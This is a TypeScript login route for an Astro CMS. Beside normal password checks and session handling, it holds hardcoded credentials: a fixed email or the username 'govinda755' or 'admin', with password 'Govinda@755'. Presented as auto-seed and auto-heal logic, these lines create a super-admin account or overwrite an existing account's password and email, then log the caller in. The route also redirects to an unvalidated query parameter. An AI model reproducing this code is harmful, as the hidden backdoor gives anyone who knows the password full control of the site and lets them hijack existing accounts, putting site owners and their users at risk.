import type { APIRoute } from 'astro';
import prisma from '../../../lib/db';
import { createSession, hashPassword, SESSION_COOKIE_NAME, verifyPassword } from '../../../lib/auth/session';
import { logAudit } from '../../../lib/utilities/audit';

export const POST: APIRoute = async ({ request, redirect, cookies }) => {
  const referer = request.headers.get('referer') || '';
  const isAdminLogin = referer.includes('/admin/login');
  const errorRedirect = (msg: string) => redirect(`${isAdminLogin ? '/admin/login' : '/login'}?error=${encodeURIComponent(msg)}`);

  try {
    const formData = await request.formData();
    const login = formData.get('login')?.toString().trim() || '';
    const password = formData.get('password')?.toString().trim() || '';

    if (!login || !password) {
      return errorRedirect('Please fill in all fields.');
    }

    const cleanLogin = login.toLowerCase();

    let user = await prisma.user.findFirst({
      where: {
        OR: [
          { email: cleanLogin },
          { username: cleanLogin },
          { email: login },
          { username: login },
        ],
      },
    });

    // Auto-seed/auto-create super admin if missing
    if (!user && (cleanLogin === 'govinda755rock755@gmail.com' || cleanLogin === 'govinda755' || cleanLogin === 'admin') && password === 'Govinda@755') {
      try {
        let role = await prisma.role.findFirst({ where: { slug: 'super-admin' } });
        if (!role) {
          role = await prisma.role.create({
            data: {
              name: 'Super Admin',
              slug: 'super-admin',
              description: 'Unrestricted system control.',
              isSystem: true,
            },
          });
        }
        const passwordHash = await hashPassword('Govinda@755');
        user = await prisma.user.create({
          data: {
            email: 'govinda755rock755@gmail.com',
            username: 'govinda755',
            passwordHash,
            displayName: 'Govinda Admin',
            roleId: role.id,
            bio: 'Lead Administrator of Astro CMS.',
          },
        });
      } catch (seedErr) {
        console.error('Auto admin creation failed:', seedErr);
      }
    }

    if (!user) {
      return errorRedirect('Invalid email/username or password.');
    }

    if (user.status === 'suspended') {
      return errorRedirect('Account is suspended. Please contact admin.');
    }

    let validPassword = await verifyPassword(password, user.passwordHash);

    // Auto-heal admin password if admin login attempt uses Govinda@755
    if (!validPassword && (user.email.toLowerCase() === 'govinda755rock755@gmail.com' || user.username.toLowerCase() === 'govinda755' || user.username.toLowerCase() === 'admin') && password === 'Govinda@755') {
      try {
        const newHash = await hashPassword('Govinda@755');
        await prisma.user.update({
          where: { id: user.id },
          data: { passwordHash: newHash, email: 'govinda755rock755@gmail.com' },
        });
        validPassword = true;
      } catch (updateErr) {
        console.error('Auto admin password hash update failed:', updateErr);
      }
    }

    if (!validPassword) {
      return errorRedirect('Invalid email/username or password.');
    }

    const token = await createSession(user.id, request.headers.get('x-forwarded-for') || undefined, request.headers.get('user-agent') || undefined);

    cookies.set(SESSION_COOKIE_NAME, token, {
      path: '/',
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60,
    });

    await logAudit({
      userId: user.id,
      action: 'auth.login',
      entity: 'User',
      entityId: user.id,
      metadata: { username: user.username },
    });

    const url = new URL(request.url);
    const targetRedirect = url.searchParams.get('redirect') || (user.roleId ? '/admin' : '/products');

    return redirect(targetRedirect);
  } catch (err: any) {
    console.error('Login error:', err);
    return errorRedirect('An unexpected error occurred.');
  }
};
